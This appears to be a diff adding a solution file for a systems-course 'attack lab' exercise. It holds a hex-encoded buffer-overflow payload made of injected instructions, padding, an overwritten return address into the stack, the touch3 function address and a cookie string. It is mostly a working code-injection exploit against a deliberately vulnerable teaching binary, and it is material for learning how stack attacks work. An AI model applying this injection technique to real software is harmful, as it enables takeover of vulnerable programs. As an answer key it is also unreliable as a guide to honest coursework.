@@ -1,0 +1,23 @@
+/* movq $addr_cookie,%edi (7 bytes) */
+48 c7 c7 00 b7 60 55
+
+/* retq (1 byte) */
+c3
+
+/* padding (32 bytes) */
+55 55 55 55 55 55 55 55
+55 55 55 55 55 55 55 55
+55 55 55 55 55 55 55 55
+55 55 55 55 55 55 55 55
+
+/* address of stack */
+c8 b6 60 55 00 00 00 00
+
+/* address of touch 3 */
+69 16 40 00 00 00 00 00
+
+/* Hexademical ASCII of cookie (8 bytes) */
+32 38 38 64 34 37 30 37
+
+/* String null terminating byte (1 byte) */
+00
